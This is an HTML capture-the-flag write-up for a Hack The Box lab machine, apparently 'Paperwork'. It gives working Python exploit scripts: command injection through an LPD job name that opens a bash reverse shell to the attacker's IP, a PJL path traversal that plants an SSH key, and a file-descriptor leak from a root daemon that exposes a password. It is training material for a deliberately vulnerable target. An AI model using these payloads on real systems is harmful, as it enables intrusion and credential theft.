@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Paperwork • HTB Writeup</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0b0d15;
+            color: #e0e5f0;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            background: rgba(12, 16, 28, 0.9);
+            border: 1px solid rgba(0, 255, 200, 0.15);
+            border-radius: 2rem;
+            padding: 3rem;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #6fffe0;
+            margin-bottom: 1.5rem;
+        }
+        .meta-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem 2rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 1rem;
+            margin-bottom: 2rem;
+        }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        
+        .ascii-art {
+            text-align: center;
+            opacity: 0.3;
+            font-size: 0.5rem;
+            line-height: 1.2;
+            color: #6fffe0;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="ascii-art">
+        <pre>
+██████╗  █████╗ ██████╗ ███████╗██████╗ ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
+██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
+██████╔╝███████║██████╔╝█████╗  ██████╔╝██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
+██╔═══╝ ██╔══██║██╔══██╗██╔══╝  ██╔══██╗██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
+██║     ██║  ██║██║  ██║███████╗██║  ██║╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
+╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
+        </pre>
+    </div>
+
+    <h1>🚀 HTB Paperwork - Complete Exploitation Guide</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Paperwork</span>
+        <span><strong>Difficulty:</strong> 🟢 Easy</span>
+        <span><strong>Target Ports:</strong> 80, 1515, 9100</span>
+        <span><strong>OS:</strong> 🐧 Linux</span>
+    </div>
+
+    <h2>📋 Machine Information</h2>
+    <table>
+        <tr><th>Property</th><th>Value</th></tr>
+        <tr><td><strong>Machine Name</strong></td><td>Paperwork</td></tr>
+        <tr><td><strong>Difficulty</strong></td><td>🟢 Easy</td></tr>
+        <tr><td><strong>Target Ports</strong></td><td>80 (HTTP), 1515 (LPD), 9100 (JetDirect)</td></tr>
+    </table>
+
+    <h2>🔍 Reconnaissance</h2>
+
+    <h3>Port Scanning</h3>
+    <pre><code>nmap -p- --min-rate 10000 &lt;IP&gt;
+nmap -p 22,80,1515,9100 -sC -sV &lt;IP&gt;</code></pre>
+
+    <h3>Web Enumeration</h3>
+    <p>Add to <code>/etc/hosts</code>:</p>
+    <pre><code>echo "&lt;IP&gt; paperwork.htb" | sudo tee -a /etc/hosts</code></pre>
+    <p>Browse to <code>http://paperwork.htb</code> - discovered:</p>
+    <ul>
+        <li><strong>Target Queue:</strong> <code>archive_intake</code></li>
+        <li><strong>Internal Processor:</strong> <code>/download/archive</code></li>
+        <li><strong>Protocol:</strong> RFC 1179 (LPD)</li>
+    </ul>
+
+    <h2>🛠️ Stage 1: LPD Service Exploitation (Initial Foothold)</h2>
+
+    <h3>Vulnerability</h3>
+    <p>The LPD service (<code>/opt/LPDServer/server.py</code>) contains an RCE vulnerability where the <code>job_name</code> from the control file is passed unsanitized to <code>subprocess.Popen</code> with <code>shell=True</code>.</p>
+
+    <h3>Exploit - Reverse Shell</h3>
+    <div class="box warning">
+        <strong>⚠️ Start listener first!</strong>
+        <pre><code>nc -lvnp 4444</code></pre>
+    </div>
+    <pre><code>python3 -c "
+import socket, time
+sock = socket.socket()
+sock.connect(('&lt;IP&gt;', 1515))
+sock.send(b'\x02archive_intake\n')
+time.sleep(0.3)
+sock.recv(1024)
+job = \"J; bash -c \\\"bash -i >& /dev/tcp/&lt;YOUR_IP&gt;/4444 0>&1\\\" #\n\"
+header = b'\x02' + str(len(job)).encode() + b'\n'
+sock.send(header)
+time.sleep(0.3)
+sock.recv(1024)
+sock.send(job.encode())
+time.sleep(0.3)
+sock.recv(1024)
+sock.send(b'\x03\x00\n')
+time.sleep(1)
+sock.close()
+print('[+] Done!')
+"</code></pre>
+
+    <h3>Result</h3>
+    <pre><code>lp@paperwork:/opt/LPDServer$</code></pre>
+
+    <h3>LPD Protocol Breakdown</h3>
+    <table>
+        <tr><th>Step</th><th>Action</th></tr>
+        <tr><td>1</td><td><code>\x02 + queue_name + \n</code> → Select queue</td></tr>
+        <tr><td>2</td><td>Wait for <code>\x00</code> ACK</td></tr>
+        <tr><td>3</td><td><code>\x02 + length + \n</code> → Header</td></tr>
+        <tr><td>4</td><td><code>J;command; #\n</code> → Control file with payload</td></tr>
+        <tr><td>5</td><td><code>\x03\x00\n</code> → Finalize</td></tr>
+    </table>
+
+    <h2>🖥️ Stage 2: User Privilege Escalation (lp → archivist)</h2>
+
+    <h3>Discovery</h3>
+    <p>While enumerating as <code>lp</code>:</p>
+    <pre><code>lp@paperwork:/opt/LPDServer$ netstat -tulpn | grep 9100
+tcp 0 0 127.0.0.1:9100 0.0.0.0:* LISTEN 987/python3</code></pre>
+
+    <h3>JetDirect Service Analysis</h3>
+    <p>The service <code>/home/archivist/printer/jetdirect.py</code> runs on port 9100 with file upload capabilities via the <code>@PJL FSDOWNLOAD</code> command.</p>
+
+    <h3>Generate SSH Key</h3>
+    <pre><code># On attacker machine
+ssh-keygen -t ed25519 -f /tmp/paperwork_key -N ""
+cat /tmp/paperwork_key.pub</code></pre>
+
+    <h3>Upload SSH Key via JetDirect</h3>
+    <pre><code># From lp shell
+python3 -c "
+import socket, time
+KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHWq4BmbOVcL3hzYC8J5...'
+s = socket.socket()
+s.connect(('127.0.0.1', 9100))
+cmd = '@PJL FSDOWNLOAD NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=' + str(len(KEY)) + '\r\n'
+s.send(cmd.encode())
+time.sleep(0.5)
+s.send(KEY.encode())
+time.sleep(2)
+s.close()
+print('[+] Key uploaded!')
+"</code></pre>
+
+    <h3>SSH as archivist</h3>
+    <pre><code># On attacker machine
+ssh -i /tmp/paperwork_key archivist@&lt;IP&gt;</code></pre>
+
+    <h3>Result</h3>
+    <div class="box success">
+        <pre><code>archivist@paperwork:~$ cat user.txt
+1fbc25849*****5286122d989</code></pre>
+    </div>
+
+    <h2>👑 Stage 3: Root Privilege Escalation (archivist → root)</h2>
+
+    <h3>Discovery</h3>
+    <p>Found a local UNIX management socket:</p>
+    <pre><code>archivist@paperwork:~$ ps aux | grep root
+root 1488 0.0 0.4 28432 17940 ? Ss 22:59 0:00 /usr/bin/python3 /usr/bin/paperwork-daemon</code></pre>
+
+    <h3>Understanding the Vulnerability</h3>
+    <p><code>/usr/bin/paperwork-daemon</code> runs as root and:</p>
+    <ul>
+        <li>Reads <code>/etc/paperwork/admin_pins.conf</code></li>
+        <li>Sends file descriptors via <code>SCM_RIGHTS</code> on UNIX socket</li>
+        <li>Checks for malicious keywords in <code>/home/archivist/printer/logs/commands.log</code></li>
+        <li><strong>Keywords:</strong> <code>FSQUERY</code>, <code>FSUPLOAD</code>, <code>FSDOWNLOAD</code></li>
+    </ul>
+
+    <h3>Python Script - Get Root Credentials</h3>
+    <pre><code>#!/usr/bin/env python3
+import socket
+import array
+import os
+
+def get_admin_password():
+    with open("/home/archivist/printer/logs/commands.log", "a") as f:
+        f.write("FSDOWNLOAD\n")
+    
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.connect("/run/paperwork/mgmt.sock")
+    
+    msg, ancdata, _, _ = s.recvmsg(4096, socket.CMSG_LEN(8))
+    print(f"[+] Message: {msg.decode()}")
+    
+    for level, type_, data in ancdata:
+        if level == socket.SOL_SOCKET and type_ == socket.SCM_RIGHTS:
+            fds = array.array("i")
+            fds.frombytes(data[:len(data) - (len(data) % 4)])
+            print(f"[+] Received FDs: {list(fds)}")
+            
+            for fd in fds:
+                os.lseek(fd, 0, os.SEEK_SET)
+                content = os.read(fd, 1024).decode()
+                print(f"FD {fd} content:\n{content}")
+                if "ADMIN_PASSWORD" in content:
+                    password = content.split("=")[1].strip()
+                    print(f"\n[!] ADMIN_PASSWORD={password}")
+                    return password
+    
+    s.close()
+
+if __name__ == "__main__":
+    get_admin_password()</code></pre>
+
+    <h3>Execute the Script</h3>
+    <pre><code>archivist@paperwork:~$ python3 get_password.py
+[+] Message: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
+[+] Received FDs: [4, 5]
+FD 4 content:
+FSDOWNLOAD
+FD 5 content:
+ADMIN_PASSWORD=Appare******edar22
+
+[!] ADMIN_PASSWORD=Appare******edar22</code></pre>
+
+    <h3>Switch to Root</h3>
+    <pre><code>archivist@paperwork:~$ su -
+Password: ApparelMortuaryCedar22
+root@paperwork:~# whoami
+root</code></pre>
+
+    <h3>Root Flag</h3>
+    <div class="box success">
+        <pre><code>root@paperwork:~# cat root.txt
+9cc798b69************10d2e16f55f3</code></pre>
+    </div>
+
+    <h2>📊 Attack Chain Summary</h2>
+    <pre><code>┌─────────────────────────────────────────────────────────────────┐
+│ 1. LPD RCE (Port 1515)                                        │
+│    └─> Shell as lp                                            │
+├─────────────────────────────────────────────────────────────────┤
+│ 2. JetDirect FSDOWNLOAD (Port 9100)                           │
+│    └─> Upload SSH key → Shell as archivist                    │
+├─────────────────────────────────────────────────────────────────┤
+│ 3. Paperwork-daemon SCM_RIGHTS FD Leak                        │
+│    └─> Leak /etc/paperwork/admin_pins.conf                    │
+│    └─> ADMIN_PASSWORD=Appare******edar22                      │
+├─────────────────────────────────────────────────────────────────┤
+│ 4. su - root                                                  │
+│    └─> Shell as root                                          │
+└─────────────────────────────────────────────────────────────────┘</code></pre>
+
+    <h2>🔧 Tools Used</h2>
+    <table>
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td><strong>Nmap</strong></td><td>Port scanning</td></tr>
+        <tr><td><strong>Python3</strong></td><td>Exploit development</td></tr>
+        <tr><td><strong>SSH</strong></td><td>Remote access</td></tr>
+        <tr><td><strong>Netcat</strong></td><td>Reverse shell listener</td></tr>
+    </table>
+
+    <h2>📝 Key Files</h2>
+    <table>
+        <tr><th>File</th><th>Purpose</th></tr>
+        <tr><td><code>/opt/LPDServer/server.py</code></td><td>Vulnerable LPD service</td></tr>
+        <tr><td><code>/home/archivist/printer/jetdirect.py</code></td><td>JetDirect service</td></tr>
+        <tr><td><code>/usr/bin/paperwork-daemon</code></td><td>Root daemon with SCM_RIGHTS</td></tr>
+        <tr><td><code>/etc/paperwork/admin_pins.conf</code></td><td>Contains root password</td></tr>
+    </table>
+
+    <div class="box warning">
+        <strong>🚨 Important Notes:</strong>
+        <ul>
+            <li><strong>SSH Key:</strong> Replace with your own generated key</li>
+            <li><strong>Reset Machine:</strong> If exploit fails, reset the machine on HTB</li>
+            <li><strong>Port 1515:</strong> If connection times out, machine may be down (reset)</li>
+        </ul>
+    </div>
+
+    <h2>📚 References</h2>
+    <ul>
+        <li>RFC 1179 - Line Printer Daemon Protocol</li>
+        <li>SCM_RIGHTS - Sending File Descriptors over UNIX Sockets</li>
+        <li>CVE-2001-1583 - LPD Vulnerability</li>
+        <li>PJL (Printer Job Language) - FSDOWNLOAD Command</li>
+    </ul>
+
+    <div class="nav-buttons">
+        <a href="../../writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+
+    <div class="footer">NIGHT PULSE X • 2026</div>
+
+</div>
+
+</body>
+</html>
